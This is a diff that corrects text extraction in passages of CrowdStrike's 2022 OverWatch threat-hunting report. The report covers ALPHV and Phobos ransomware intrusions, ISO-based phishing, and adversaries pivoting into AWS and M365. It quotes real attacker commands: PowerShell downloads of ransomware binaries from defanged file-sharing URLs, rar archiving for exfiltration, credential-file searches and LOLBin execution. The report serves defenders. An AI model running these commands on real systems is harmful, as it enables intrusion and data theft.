-programdata1\.evtx 
-q:
+\\programdata\\1\.evtx “
+/q:
 \*\[System \[TimeCreated\[@
 SystemTime \>
-
+’
 \[REDACTED]
-
+’
 ]
 ]
-]
+]”
 They then used rar
 .exe to archive the collected event entries ready for exfiltration.
 C:
-programdataRar
+\\programdata\\Rar
 .exe a \-ag \-m3 c:
-programdatadate.rar C:
-
-programdata1\.evtx
+\\programdata\\date.rar C:
+\\
+programdata\\1\.evtx
 22 
 For more information on this technique, see the MITRE website:
-https:attack.mitre.orgtechniquesT1003001\.
+https://attack.mitre.org/techniques/T1003/001/.
 23 
 For more information on this technique, see the MITRE website:
-https:attack.mitre.orgtechniquesT1560001\.
+https://attack.mitre.org/techniques/T1560/001/.
 24 
 For more information on this technique, see the MITRE website:
-https:attack.mitre.orgtechniquesT1021002\.
+https://attack.mitre.org/techniques/T1021/002/.
 Nowhere to Hide: 2022 Falcon OverWatch Threat Hunting Report
 CrowdStrike
 45
@@ -2217,9 +2299,9 @@ potential impact of compromised credentials.
 Combining technology, people and process is key. When it comes to reliably defending 
 against increasingly capable adversaries, this trifecta provides the most comprehensive 
 and rapid detections for sophisticated and stealthy intrusions.
-In this case, AQUATIC PANDAs operations were systematically unraveled as a result of 
-Falcon OverWatchs 247 human\-driven threat hunting operations. This comes despite 
-AQUATIC PANDA establishing a deep level of access into the victim organizations network 
+In this case, AQUATIC PANDA’s operations were systematically unraveled as a result of 
+Falcon OverWatch’s 24/7 human\-driven threat hunting operations. This comes despite 
+AQUATIC PANDA establishing a deep level of access into the victim organization’s network 
 and having a large number of privileged credentials in their control; making diligent efforts 
 to operate covertly; and having an expansive number of persistent entry points into the 
 network. OverWatch bridged the gap for the victim organization in this case, arming the 
@@ -2284,15 +2366,21 @@ to the non\-standard locations listed below. These tools were
 representative of tooling that OverWatch regularly observes prior to 
 ransomware deployment, including commodity scanning software, 
 file tampering tools, tools for enumeration and credential harvesting 
-objectives, and finally a Phobos ransomware binary.\+
+objectives, and finally a Phobos ransomware binary.
+ 
+\+
 C:
-PerfLogs\+
+\\PerfLogs\\
+ 
+\+
 C:
-Users\[REDACTED]Desktop\+
+\\Users\\\[REDACTED]\\Desktop\\
+ 
+\+
 C:
-Users\[REDACTED]Music
+\\Users\\\[REDACTED]\\Music\\
 The OverWatch team notified the customer and continued pursuing 
-the adversary. The adversarys next step was to execute a batch script 
+the adversary. The adversary’s next step was to execute a batch script 
 that launched a series of registry changes to impair system defenses. 
 These registry changes performed a range of actions to both disable 
 security controls and tamper with security configurations to bypass 
@@ -2301,7 +2389,7 @@ The adversary then used Mimikatz and WebBrowserPassView in an
 attempt to gain access to additional user account credentials, which 
 was blocked by the Falcon platform. The victim organization in this 
 case was also subscribed to Falcon Complete managed detection and 
-response. By this point, Falcon Complete was acting on OverWatchs 
+response. By this point, Falcon Complete was acting on OverWatch’s 
 detections and contained the affected host before the ransomware 
 could be executed. The Falcon Complete team then worked with 
 the customer to remove the threat from the environment and 
@@ -2314,7 +2402,7 @@ Falcon console exclusively,
 includes a complete 
 annotated table of the 
 registry changes
-(see Appendix B).
+(see Appendix B). 
 LATERAL MOVEMENT
 The actor moved
  freely using 
@@ -2330,7 +2418,7 @@ WebBrowserPassView
 in an attempt to gain 
 access to additional 
 user account 
-credentials this is 
+credentials — this is 
 blocked by the Falcon 
 platform
 DEFENSE EVASION
@@ -2373,7 +2461,7 @@ Action Items for Defenders
 Review command line and process arguments for applications initiating registry 
 changes. Adversaries will actively modify settings to bypass controls and enable further 
 malicious activity. This could include modifying or adding keys associated with security 
-technologies or autostart locations. Any WDigest values being set to 1 could indicate an 
+technologies or autostart locations. Any WDigest values being set to “1” could indicate an 
 adversary preparing to steal credentials. 
 Be suspicious of activity originating from non\-standard locations. Adversaries routinely 
 use non\-standard directories to stage or execute their files or store the output of their 
@@ -2386,8 +2474,8 @@ services. If services are improperly configured, this could allow an adversary a
 foothold into the environment. Any user accounts with weak credentials could be low\-
 hanging fruit for adversaries to exploit and operate beneath.
 25 
- For more on the SEARCH methodology, see https:www.youtube.comwatch?v\=YxcnI\_ZjQAA and https:
-www.crowdstrike.comresourcescrowdcastsdont\-wait\-to\-be\-a\-cyber\-victim\-search\-for\-hidden\-threats. 
+ For more on the SEARCH methodology, see https://www.youtube.com/watch?v\=YxcnI\_ZjQAA and https://
+www.crowdstrike.com/resources/crowdcasts/dont\-wait\-to\-be\-a\-cyber\-victim\-search\-for\-hidden\-threats/. 
 Nowhere to Hide: 2022 Falcon OverWatch Threat Hunting Report
 CrowdStrike
 49
@@ -2401,14 +2489,14 @@ accounts of three Windows systems. The adversary was operating
 over ScreenConnect remote access software, and OverWatch quickly 
 picked up on suspicious reconnaissance and tool transfer activity. The 
 adversary used PowerShell to acquire ALPHV binaries from multiple 
-public file\-sharing sites and store them into the PerfLogs directory.
-powershell Invoke\-WebRequest \-Uri https\[:]
-filetransfer\[.]iodata\-packageL8pJUgcEdownload 
-\-OutFile C:PerfLogsHillSouthInYourMouth.exe
+public file\-sharing sites and store them into the \\PerfLogs directory.
+powershell Invoke\-WebRequest \-Uri ‘https\[:]//
+filetransfer\[.]io/data\-package/L8pJUgcE/download’ 
+\-OutFile C:\\PerfLogs\\HillSouthInYourMouth.exe
 powershell Invoke\-WebRequest \-Uri 
-https\[:]wetransfer\[.]comdownloads
-e43s1a1864198f6cc9dd99df3f77d0820220469150915bff4f7 
-\-OutFile C:PerfLogshi3\.exe
+‘https\[:]//wetransfer\[.]com/downloads/
+e43s1a1864198f6cc9dd99df3f77d0820220469150915/bff4f7’ 
+\-OutFile C:\\PerfLogs\\hi3\.exe
 Next, the adversary executed one of these ALPHV binaries, which carried 
 out a number of operations that OverWatch recognized as inline with 
 pre\-ransomware activity. These included the creation of a new user 
@@ -2429,9 +2517,9 @@ COMMAND AND CONTROL
 Afliate uses 
 PowerShell to acquire 
 ALPHV binaries from 
-multiple public le\- 
+multiple public ﬁle\- 
 sharing sites and store 
-them into the PerfLogs 
+them into the \\PerfLogs 
 directory
 INITIAL ACCESS
 INITIAL ACCESS
@@ -2466,7 +2554,7 @@ IMPACT
 Afliate makes 
 attempts to delete 
 volume shadow 
-copies this is 
+copies — this is 
 blocked by the 
 Falcon platform
 Nowhere to Hide: 2022 Falcon OverWatch Threat Hunting Report
@@ -2474,8 +2562,8 @@ CrowdStrike
 50
 The ALPHV binary also executed the following registry change:
 reg add 
-HKEY\_LOCAL\_MACHINESYSTEMCurrentControlSetServices
-LanmanServerParameters v MaxMpxCt d 65535 t REG\_DWORD f
+HKEY\_LOCAL\_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\
+LanmanServer\\Parameters /v MaxMpxCt /d 65535 /t REG\_DWORD /f”
 This change will alter the maximum number of concurrent outstanding networking 
 requests allowed by the SMB server. Making this change enables the adversary to prevent 
 remote file access issues when distributing the ALPHV ransomware binary across multiple 
@@ -2485,8 +2573,8 @@ indicated its association with ALPHV. During execution of the ALPHV file, an acc
 token was supplied that was necessary for it to execute properly. This token is a unique 
 key that identifies the victim and is used by the victim when they navigate to the .onion 
 payment site referenced within the ransom file.
-C:PerfLogsHillSouthInYourMouth.exe access\-token 
-Due to OverWatchs early identification of this pre\-ransomware activity, the victim 
+C:\\PerfLogs\\HillSouthInYourMouth.exe \-\-access\-token 
+Due to OverWatch’s early identification of this pre\-ransomware activity, the victim 
 organization was able to remediate affected hosts before the adversary could achieve 
 mission objectives. Following the intrusion, OverWatch worked closely with the customer 
 to analyze the associated binaries, which were confirmed to be associated with ALPHV.
@@ -2494,28 +2582,19 @@ OverWatch continues to see ALPHV affiliates performing BGH operations, and it is
 important to understand their TTPs to identify these adversaries in the early stages, 
 before encryption can take place.
 Figure 6\. Execution of an ALPHV binary leading to pre\-ransomware tradecraft
-
+–
 \+
-
-
-
+–
+–
+–
 \+
-
+–
 \+
 WININIT.EXE
 SERVICES.EXE
-ENTSERVICE.EXE
+...ENTSERVICE.EXE
 CMD.EXE
-
-\+
-CMD.EXE
-\+
-\+
-CMD.EXE
-\+
-\+
-CMD.EXE
-
+–
 \+
 CMD.EXE
 \+
@@ -2524,10 +2603,19 @@ CMD.EXE
 \+
 \+
 CMD.EXE
+–
+\+
+CMD.EXE
 \+
 \+
 CMD.EXE
-NYOURMOUTH.EXE
+\+
+\+
+CMD.EXE
+\+
+\+
+CMD.EXE
+...NYOURMOUTH.EXE
 VSSADMIN.EXE
 REG.EXE
 Nowhere to Hide: 2022 Falcon OverWatch Threat Hunting Report
@@ -2571,14 +2659,14 @@ tradecraft, or should consider partnering with a vendor that can provide immedia
 uplift with a skilled and mature hunting program.
 A common entry point for affiliates is through exploiting vulnerable external services or user 
 account credentials. However, it is not uncommon to see adversaries exploiting emerging 
-vulnerabilities or relying on access brokers to do the legwork this is especially concerning 
+vulnerabilities or relying on access brokers to do the legwork — this is especially concerning 
 because eCrime groups can effectively buy access to an environment and then leverage 
 RaaS toolkits for ransomware deployment. 
 RaaS models also open up the ever\-present threat of data extortion by the eCrime affiliates 
 threatening to leak or sell data to improve their chances of being paid. A technique some 
-affiliates use, dubbed double extortion, involves the exfiltration of data prior to ransomware 
+affiliates use, dubbed “double extortion,” involves the exfiltration of data prior to ransomware 
 deployment to gain more leverage when they demand payment. These are not just empty 
-threats RaaS operators provide dedicated leak sites and community support for their 
+threats — RaaS operators provide dedicated leak sites and community support for their 
 affiliates to use if needed.
 CrowdStrike Intelligence has recently assessed that although Phobos variants are still in use, 
 its affiliates are likely beginning to move toward ALPHV and AvosLocker RaaS programs, 
@@ -2652,18 +2740,18 @@ While not a novel technique, the uptick in threat actors using ISO
 files in their phishing attempts is a new trend that OverWatch has 
 been monitoring closely. CrowdStrike Intelligence has assessed that 
 adversaries began making the shift to using ISO files in response 
-to Microsofts announcement that it would begin disabling internet\-
+to Microsoft’s announcement that it would begin disabling internet\-
 enabled macros in Office documents by default. 
 OverWatch observed malicious actors already adapting their 
 operations well ahead of the planned patches that began rolling out 
-in April 2022, with an increase in ISO delivery starting in late 2021
+in April 2022, with an increase in ISO delivery starting in late 2021/
 early 2022\. This modus operandi has impacted the technology, 
-healthcare, mining and media verticals particularly but has been 
+healthcare, mining and media verticals particularly — but has been 
 seen sporadically throughout many other verticals.
 Verticals Discussed in 
 This Feature:
 ISO 9660 is the standard file system for CD\-ROMs. This international standard 
-gave rise to the term ISO\-image, which is essentially a digital copy of a disc, 
+gave rise to the term “ISO\-image,” which is essentially a digital copy of a disc, 
 including a full and intact file structure. ISO\-images are widely used today to 
 distribute large programs or software to include operating systems. ISO\-images 
 can be mounted by use of a virtual optical disk drive, which can then be interacted 
@@ -2693,10 +2781,10 @@ C2
 Redirects to
 www
 www
-HKEY\_CURRENT\_USERSOFTWAREJavaSoftVer2
-HKEY\_CURRENT\_USERSOFTWAREJavaSoftVer
-https\[:]midcitylanews\[.]com:433newsupdateaaa
-https\[:]midcitymessenger\[.]com
+HKEY\_CURRENT\_USER\\SOFTWARE\\JavaSoft\\Ver2
+HKEY\_CURRENT\_USER\\SOFTWARE\\JavaSoft\\Ver
+https\[:]//midcitylanews\[.]com:433/news/update/aaa
+https\[:]//midcitymessenger\[.]com//
 Figure 7\. Malicious ISO file leads to deployment of Cobalt Strike Beacon and C2 communication
 Beginning in Q4 2021, COZY BEAR initiated a new wave of phishing observed by 
 OverWatch as early as December 2021 and as recently as March 2022\. Threat hunters 
@@ -2704,7 +2792,7 @@ identified the Russian threat actor delivering a malicious ISO image file (Covid
 embedded into an HTML file (Covid\_information.html) via email. Further analysis by 
 the CrowdStrike Intelligence team found that the image file contained an HTA file
 (Covid.hta). This HTA file contained malicious VBScript (VBS) that created two registry 
-values including a PowerShell loader script and Base64\-encoded shellcode. 
+values — including a PowerShell loader script and Base64\-encoded shellcode. 
 Further analysis by CrowdStrike Intelligence showed that a new instance of PowerShell 
 was spawned by the HTA file, which in turn executed the previously stored loader script, 
 pointing it toward the shellcode. The shellcode ultimately led to Reflective Code Loading 
@@ -2714,35 +2802,37 @@ additional instructions and perform further malicious operations on the targeted
 Nowhere to Hide: 2022 Falcon OverWatch Threat Hunting Report
 CrowdStrike
 56
-WIZARD SPIDERs BazarLoader 
+WIZARD SPIDER’s BazarLoader 
 Delivered in ISO Files
 Also in Q4 2021, OverWatch observed a campaign leveraging ISO files to 
-deliver WIZARD SPIDERs BazarLoader. BazarLoader is a downloader 
+deliver WIZARD SPIDER’s BazarLoader. BazarLoader is a downloader 
 and backdoor that is typically used to perform post\-exploitation and pre\-
 ransomware activity on a compromised system.
 In one notable intrusion from this campaign, threat hunters observed 
 a targeted user fall victim to a successful phish where the following 
 malicious link was clicked on:
-https\[:]www.transfernow\[.]netdl202110088o9UcfuH
+https\[:]//www.transfernow\[.]net/dl/202110088o9UcfuH/
 SQNv3wqD
 Following a successful DNS query and connection to the C2 server, 
 threat hunters observed host activity where VLC media player (vlc.exe) 
 executed a downloaded ISO image (Documents.iso), as outlined in the 
 below command\-line sample:
-C:Program FilesVideoLANVLCvlc.exe started\-from\-fileC:Users\[REDACTED]DownloadsDocuments.iso
+“C:\\Program Files\\VideoLAN\\VLC\\vlc.exe” \-\-started\-from\-file 
+
+“C:\\Users\\\[REDACTED]\\Downloads\\Documents.iso”
 Upon execution of the ISO file, a Windows shortcut file (Documents.lnk) 
 was created. This LNK file in turn pointed toward a malicious
  DLL file (1\.dll) that was executed under the native Windows binary 
-
-rundll32\.exe. Further analysis revealed that this DLL files SHA256 
+­
+rundll32\.exe. Further analysis revealed that this DLL file’s SHA256 
 hash was that of a BazarLoader binary.
 Nowhere to Hide: 2022 Falcon OverWatch Threat Hunting Report
 CrowdStrike
 57
-LUNAR SPIDERs BokBot Delivered 
+LUNAR SPIDER’s BokBot Delivered 
 Using ISO Files
 In early 2022, OverWatch threat hunters observed a campaign 
-delivering LUNAR SPIDERs BokBot trojan. The characteristics of this 
+delivering LUNAR SPIDER’s BokBot trojan. The characteristics of this 
 campaign bore a strong resemblance to similar campaigns observed 
 throughout 2021\.
 BokBot, a downloader tracked by CrowdStrike Intelligence, has two 
@@ -2751,18 +2841,18 @@ these loaders is to obtain the core banking module from a C2 server.
 In this specific intrusion, BokBot was delivered through the abuse of 
 ISO files.
 Phishing emails were delivered to victims containing an external 
-URL link sampled below that would allow for the download of a 
+URL link — sampled below — that would allow for the download of a 
 password\-protected ZIP file.
-http\[:]nelionexports\[.]insatirizing.php
+http\[:]//nelionexports\[.]in/satirizing.php
 The ZIP file (report\-0222530\.zip) contained an ISO image 
-(doc\_1138\.iso) that was mounted to disk under DeviceCdRom0\. 
+(doc\_1138\.iso) that was mounted to disk under \\Device\\CdRom0\. 
 Embedded within the disk image was a Windows shortcut LNK file 
 (documents.lnk). In parallel, the ISO image also housed a suspicious 
 DLL with the naming convention of data.dll. This DLL was then 
 executed by the previously mentioned LNK file, which also leveraged 
 Windows native binary regsvr32\.exe in an attempt to evade defenses 
 by way of system binary proxy execution.
-C:WindowsSystem32cmd.exe c start regsvr32\.exe 
+“C:\\Windows\\System32\\cmd.exe” /c start regsvr32\.exe 
 data.dll
 Adversary attempts to evade defenses using Windows native binary 
 Upon execution of the aforementioned data.dll binary, a connection 
@@ -2781,19 +2871,19 @@ being abused in an intrusion by a suspected ransomware\-as\-a\-service
 deliver Cobalt Strike. After a successful phishing attempt, OverWatch 
 threat hunters observed a connection to domain fromsmash\[
 .
-]com 
+]com — 
 a domain to the Smash file\-sharing service. According to CrowdStrike 
 Intelligence, this domain has been publicly reported as being used for 
 the distribution of Shindig.
 Threat hunters discovered that the ISO image (mounted under
-
-DeviceCdRom0\) contained a Windows shortcut file 
+​
+\\Device\\CdRom0\\) contained a Windows shortcut file 
 (New Folder
 .lnk) and DLL (service.dll) that was later identified 
 as Shindig. Upon opening, the LNK file was spawned, which in turn 
 leveraged Rundll32\.exe to execute the Shindig binary, as sampled 
 below:
-C:WindowsSystem32rundll32\.exe 
+“C:\\Windows\\System32\\rundll32\.exe” 
 service.dll,UxRSYlmZxw
 Following execution of the malicious Shindig binary, Cobalt Strike 
 was injected into the native Windows process wabmig.exe. Shortly 
@@ -2819,13 +2909,13 @@ OverWatch remains committed to honing its ability to identify adversary
 behaviors and improving its hunting processes. Through the analysis 
 of these ISO phishing attempts, OverWatch partnered with the Falcon 
 product team to increase the capabilities of the Falcon sensor to expand 
-sensor coverage and improve OverWatchs visibility enabling them to 
+sensor coverage and improve OverWatch’s visibility — enabling them to 
 hunt for these types of malicious activities and others more effectively. 
 In addition to ISO files, OverWatch observed adversaries use LNK, MSI 
 and XLL file types in their phishing attempts. Adversaries are diversifying 
 their phishing toolkits with the understanding that no one technique 
-can be solely relied upon rather, multiple tools and techniques are 
-necessary to ensure the best chance of gaining access to todays 
+can be solely relied upon — rather, multiple tools and techniques are 
+necessary to ensure the best chance of gaining access to today’s 
 hardened environments. OverWatch is aware of this and is continuously 
 improving its hunting operations to unearth all malicious, hands\-on\-
 keyboard activity.
@@ -2864,7 +2954,7 @@ Hunt for mounting of suspicious ISO images:
 event\_platform\=win event\_simpleName IN (FsVolumeMounted,
 RemovableMediaVolumeMounted, SnapshotVolumeMounted)
 VirtualDriveFileType\_decimal\=1
-\| rex field\=VirtualDriveFileName (?i)(?(ISO\|IMG))
+\| rex field\=VirtualDriveFileName “(?i).\*\\\\\\(?.\*\\.(ISO\\\|IMG))”
 \| table ContextTimeStamp\_decimal, aid, ComputerName,
 VolumeDriveLetter,VolumeName, isoName, VirtualDriveFileName
 \| rename ContextTimeStamp\_decimal as endpointSystemClock, aid as
@@ -2886,7 +2976,7 @@ notifications warrant a quick and decisive response. Moreover, it is advisable t
 processes in place to respond. The ability to respond effectively and efficiently to an 
 OverWatch notification is valuable, as the organization in this scenario quickly learned. 
 Earlier this year, OverWatch observed an adversary use the legitimate PsExec utility to 
-connect to a host within the victims environment. This activity originated from a host in the 
+connect to a host within the victim’s environment. This activity originated from a host in the 
 multi\-vendor environment in a segment where the Falcon sensor was not deployed. Once 
 connected, the adversary enumerated local user accounts, queried other logged\-in users 
 and reset the password for the privileged local Administrator account. 
@@ -2896,16 +2986,16 @@ password. OverWatch had seen the exact same password used in another confirmed
 intrusion attempt, and therefore notified the victim organization with high confidence that 
 there was malicious, ongoing hands\-on\-keyboard activity in their environment that required 
 immediate action.
-OverWatchs timely notification prompted the victim organization to expedite the 
-deployment of additional Falcon sensor coverage across their environment ensuring 
+OverWatch’s timely notification prompted the victim organization to expedite the 
+deployment of additional Falcon sensor coverage across their environment — ensuring 
 full visibility and enabling thorough analysis by OverWatch threat hunters. The victim 
 organization also quickly network\-contained the affected hosts to prevent any further 
 lateral movement. 
 This is exactly the type of partnership OverWatch aims to have with its customers. Quick 
 response times and a two\-way flow of information limit the potential damage that an 
 adversary can do. It also enables deep analysis by our threat hunters to provide a full 
-picture of an adversarys movements, which better positions OverWatch to support 
-victim organizations remediation efforts. This organizations ability to quickly address the 
+picture of an adversary’s movements, which better positions OverWatch to support 
+victim organizations’ remediation efforts. This organization’s ability to quickly address the 
 identified blind spots in their endpoint coverage is a great example of the proactive security 
 posture that all defenders should enact in their own environment.
 Nowhere to Hide: 2022 Falcon OverWatch Threat Hunting Report
@@ -2918,16 +3008,16 @@ OverWatch
 Showcases 
 the Future of 
 Threat Hunting
-Change is the only constant in the world of threat hunting 
+Change is the only constant in the world of threat hunting — 
 and the only way to stay ahead of the adversary is to adapt. 
 OverWatch continually develops its technology and capability to 
 adapt to shifts in adversary activity.
 All signs point to the fact that adversaries are following the 
 increasing trend in cloud adoption and are quickly building 
-their capability to navigate and exploit cloud workloads but 
-OverWatchs hunters are right there with them. OverWatch is 
+their capability to navigate and exploit cloud workloads — but 
+OverWatch’s hunters are right there with them. OverWatch is 
 actively building out its cloud hunting capabilities.
-The work that OverWatchs expert threat hunters do to protect 
+The work that OverWatch’s expert threat hunters do to protect 
 victim environments around the clock would not be possible 
 without the innovative technology that enables hunters to quickly 
 zero\-in on suspicious telemetry. In the past year, OverWatch has 
@@ -2941,7 +3031,7 @@ OverWatch Takes to
 the Sky: Hunting for 
 Adversaries in the Cloud
 Adversaries continue to adapt to the evolving world of cloud technology and are actively 
-seeking to capitalize on the opportunity it presents to exploit gaps in an organizations 
+seeking to capitalize on the opportunity it presents to exploit gaps in an organization’s 
 defenses. While organizations globally look to the cloud to aid with business objectives, 
 such as scalability, adversaries view the cloud as yet another arena to pursue their quest for 
 intellectual property theft, data extortion, ransomware or simple destruction. This makes 
@@ -2949,7 +3039,7 @@ for an increasingly expansive and complex attack surface for defenders to manage
 For customers looking to increase visibility and coverage of their cloud\-based resources 
 with CrowdStrike Cloud Security, OverWatch now delivers proactive threat hunting 
 dedicated to continuously uncovering hidden and advanced threats originating, operating 
-and persisting in cloud environments. Falcon OverWatch Cloud Threat Hunting applies 
+and persisting in cloud environments. Falcon OverWatch Cloud Threat Hunting™ applies 
 the same systematic and comprehensive hunting methodology and leverages the 
 added telemetry delivered by CrowdStrike Cloud Security to achieve visibility into cloud 
 environments and identify the early stages of adversary activity.
@@ -2957,7 +3047,7 @@ For organizations without CrowdStrike Cloud Security, OverWatch still has some v
 of cloud\-based threats. Traditional information technology (IT) assets in organizations 
 remain a gateway to the cloud, interacting heavily with the management of cloud 
 infrastructure. To exploit cloud assets, adversaries may first access traditional IT assets 
-to pivot to applications, systems andor data processed in the cloud. The following case 
+to pivot to applications, systems and/or data processed in the cloud. The following case 
 studies highlight examples where OverWatch observed adversaries doing just that. 
 Nowhere to Hide: 2022 Falcon OverWatch Threat Hunting Report
 CrowdStrike
@@ -2966,13 +3056,13 @@ Adversary Pivots from Traditional
 Endpoint to AWS Cloud Resources
 In Q4 2021, OverWatch discovered an unknown PANDA adversary 
 operating on multiple Linux hosts in the environment of a gaming 
-organization. The adversarys initial actions included unusual network 
+organization. The adversary’s initial actions included unusual network 
 connectivity checks and other host reconnaissance commands that are 
 frequently observed by OverWatch and that, as a result, stood out to the 
 threat hunters. The adversary attempted to gather information about the 
 hosts and the environment, discover additional credentials and establish 
 greater persistence to the hosts. The adversary then discovered that 
-one of the compromised hosts had access to the victim organizations 
+one of the compromised hosts had access to the victim organization’s 
 Amazon Web Services (AWS) console environment. Knowing they 
 could access the AWS console environment via the AWS command 
 line interface, the adversary quickly changed their focus and began to 
@@ -2982,13 +3072,13 @@ A Bit About Securing AWS
 The AWS command line interface was developed by Amazon to provide customers with a 
 mechanism to automate the management of AWS services. Access to use the AWS command 
 line interface requires that accounts be configured with an access key in Identity and Access 
-Management (IAM), and have a key ID and secret access key assigned to it. This is set in the users 
-home directory in the .awscredentials file. This file is a simple text file and can be viewed by 
-anyone with access to an accounts home directory. The ID and key are set as shown in the example 
+Management (IAM), and have a key ID and secret access key assigned to it. This is set in the user’s 
+home directory in the .aws/credentials file. This file is a simple text file and can be viewed by 
+anyone with access to an account’s home directory. The ID and key are set as shown in the example 
 below.
 \[default]
-aws\_access\_key\_id\=ABCDEFG12345
-aws\_secret\_access\_key\=a1b2c3d4e5f6
+aws\_access\_key\_id\=ABCDEFG12345…
+aws\_secret\_access\_key\=a1b2c3d4e5f6…
 As a result, it is critical to only grant AWS accounts the privileges they need and not grant overly 
 permissive access. Anyone who accesses the account can steal this information for use on 
 adversary infrastructure or can use it directly on a compromised host.
@@ -2999,7 +3089,7 @@ CrowdStrike
 65
 The adversary used the aws command to query for metadata on all EC2 instances in the environment, which included 
 information about security groups, network configuration and identifiers associated with each host. They also queried for 
-the password security policy that had been configured in IAM for the victims AWS environment. A sample of the commands 
+the password security policy that had been configured in IAM for the victim’s AWS environment. A sample of the commands 
 observed by OverWatch are as follows:
 Command
 Purpose
@@ -3017,7 +3107,7 @@ Returns the password policy set for IAM accounts
 aws sts get\-caller\-identity
 Displays information about the IAM user or role used to call the 
 operation
-aws ec2 describe\-regions debug
+aws ec2 describe\-regions \-\-debug
 Returns information about the AWS regions available to the account
 aws ssm describe\-instance\-information
 Displays configuration information about the IAM user that executed 
@@ -3029,8 +3119,8 @@ Displays information about the IAM user associated with the access
 key ID
 aws s3 ls
 Displays S3 objects associated with the account
-find \-name .aws
-find \-name credentials
+find / \-name .aws
+find / \-name credentials
 Discovery commands intended to locate files containing AWS access 
 key IDs and secret keys
 Nowhere to Hide: 2022 Falcon OverWatch Threat Hunting Report
@@ -3041,8 +3131,8 @@ available on an endpoint to begin their reconnaissance of the objects under the 
 of the AWS control panel and APIs. The adversary in this instance reviewed the contents 
 of configuration files for AWS, Jenkins, Docker, Ansible and other applications used to 
 manage and scale the cloud and container environments. 
-This telemetry has long been a part of OverWatchs hunting leads. The launch of 
-OverWatchs cloud hunting capabilities extends the power of threat hunting to include 
+This telemetry has long been a part of OverWatch’s hunting leads. The launch of 
+OverWatch’s cloud hunting capabilities extends the power of threat hunting to include 
 unique cloud\-based indicators of attack (IOAs) such as control plane and serverless 
 vulnerabilities, misconfigurations, application behavior anomalies, container escapes, 
 privilege escalations, node compromises and more.
@@ -3052,16 +3142,16 @@ Infrastructure
 Adversaries are not limited to any one cloud service provider. In Q1 2022, the CrowdStrike 
 Incident Response team was contacted by a victim organization that had discovered a 
 compromise of their Microsoft 365 (M365\) environment and needed help to remove the 
-adversarys access from their environment and understand how the intrusion took place. 
+adversary’s access from their environment and understand how the intrusion took place. 
 The adversary gained initial access to the environment via an exploitation of an internet\-
-facing service. They then performed extensive reconnaissance of the organizations 
+facing service. They then performed extensive reconnaissance of the organization’s 
 environment that included enumeration of hosts and accounts associated with the 
 management of the on\-premises single sign\-on (SSO) application, as well as members 
-of Active Directory groups that have privileged access to the organizations Azure tenant. 
+of Active Directory groups that have privileged access to the organization’s Azure tenant. 
 Specifically, the adversary targeted members and systems used by email administrators 
 who typically have elevated access within M365\. Ultimately, this led to the discovery of on\-
 premises domain accounts that also had the Global Administrator role assigned within the 
-organizations Azure tenant. 
+organization’s Azure tenant. 
 Nowhere to Hide: 2022 Falcon OverWatch Threat Hunting Report
 CrowdStrike
 67
@@ -3077,7 +3167,7 @@ accounts followed by performing cookie theft of the established SSO
 session from the web browser on an internal system. This was followed by 
 replaying the session from their own infrastructure to gain access to the 
 victim M365 environment. 
-Once the adversary gained access to the organizations M365 
+Once the adversary gained access to the organization’s M365 
 environment, they modified existing content searches within Microsoft 
 Purview (formerly known as Microsoft 365 Compliance) to perform 
 discovery for data of interest and blend in with normal business activity.27
@@ -3092,18 +3182,18 @@ Once the adversary provisioned the necessary access to create content
 searches, they created and executed content searches for data of interest 
 that included mailbox contents of executives within the organization. Once 
 the content searches were complete, the adversary exported the results 
-directly from M365 to their own infrastructure thus bypassing traditional 
+directly from M365 to their own infrastructure — thus bypassing traditional 
 methods of exfiltration detection based on egress network telemetry as the 
-data never directly traversed the victim organizations network. 
-Finally, the adversary attempted to cover their tracks by removing
+data never directly traversed the victim organization’s network. 
+Finally, the adversary attempted to cover their tracks by removing 
 created content searches from the Microsoft Purview console. This 
 intrusion is another example of how proficient adversaries are in 
 operating in hybrid environments to accomplish their objectives.
 26 
-https:docs.microsoft.comen\-usaspnetweb\-apioverviewsecurity
+https://docs.microsoft.com/en\-us/aspnet/web\-api/overview/security/
 integrated\-windows\-authentication
 27 
-https:docs.microsoft.comen\-usmicrosoft\-365compliance
+https://docs.microsoft.com/en\-us/microsoft\-365/compliance/
 microsoft\-365\-compliance\-center
 OverWatch 
 Customers
@@ -3120,7 +3210,7 @@ CrowdStrike
 Action Items for Defenders
 These intrusions are examples of the focus adversaries are putting on assets processed 
 and stored in cloud resources. Adversaries have demonstrated their ability to operate 
-in complex environments regardless of whether they consist of traditional endpoints, 
+in complex environments — regardless of whether they consist of traditional endpoints, 
 cloud environments or a hybrid of both. OverWatch has a lengthy history of hunting for 
 adversary activity in cloud\-hosted resources. The recent announcement of OverWatch 
 performing hunts for adversaries within the cloud management services is the extension 
@@ -3128,7 +3218,7 @@ of this experience to find adversaries regardless of where they are operating in
 environments.
 Invest in learning to harden, monitor and defend against attacks against cloud 
 resources. The benefits of cloud computing in regard to scalability, robust technology 
-offerings and physical security come with a price greater complexity in managing the 
+offerings and physical security come with a price — greater complexity in managing the 
 security of these environments. For example, even if MFA is configured for some cloud 
 services, these same services may not require MFA when accessed via a different service 
 URL. Defenders must understand these interactions and monitor them accordingly. 
@@ -3141,22 +3231,24 @@ that are appropriate for them.
 Nowhere to Hide: 2022 Falcon OverWatch Threat Hunting Report
 CrowdStrike
 69
-OverWatchs Patented 
+OverWatch’s Patented 
 Technology Delivers 
 Inimitable Threat Hunting 
 Capability 
 Threat hunting is frequently misunderstood. It is not a reactive monitoring function, nor is it a 
 remediation service. Threat hunting is proactive threat detection that sits at the intersection 
-of people, process and technology it draws on the strength of each to outmaneuver 
+of people, process and technology — it draws on the strength of each to outmaneuver 
 sophisticated adversary activity designed to evade automated detections. 
-The expertise of OverWatchs threat hunters and the strength of OverWatchs systematic 
+The expertise of OverWatch’s threat hunters and the strength of OverWatch’s systematic 
 hunting methodology, SEARCH28, has been well established over the years. But the 
-powerful technology that enables OverWatchs threat hunting capability is the unsung hero 
-of the story. OverWatch is able to go head\-to\-head with the worlds most sophisticated 
+powerful technology that enables OverWatch’s threat hunting capability is the unsung hero 
+of the story. OverWatch is able to go head\-to\-head with the world’s most sophisticated 
 adversaries because of the cutting\-edge technology and tools that this expert hunting 
 team has at its disposal. 
 Over the past year, OverWatch was granted five patents in recognition of the innovation 
-that underpins OverWatchs threat hunting operations.Narrow the Aperture: Focus Only on Events that 
+that underpins OverWatch’s threat hunting operations.
+
+Narrow the Aperture: Focus Only on Events that 
 Warrant Deeper Analysis
 At the core of everything OverWatch does sits the Computer\-Security Event Analysis 
 framework. This framework processes and triages security event data at a global scale 
@@ -3165,8 +3257,8 @@ filtered pipeline of event data for deeper analysis by threat hunters.The patter
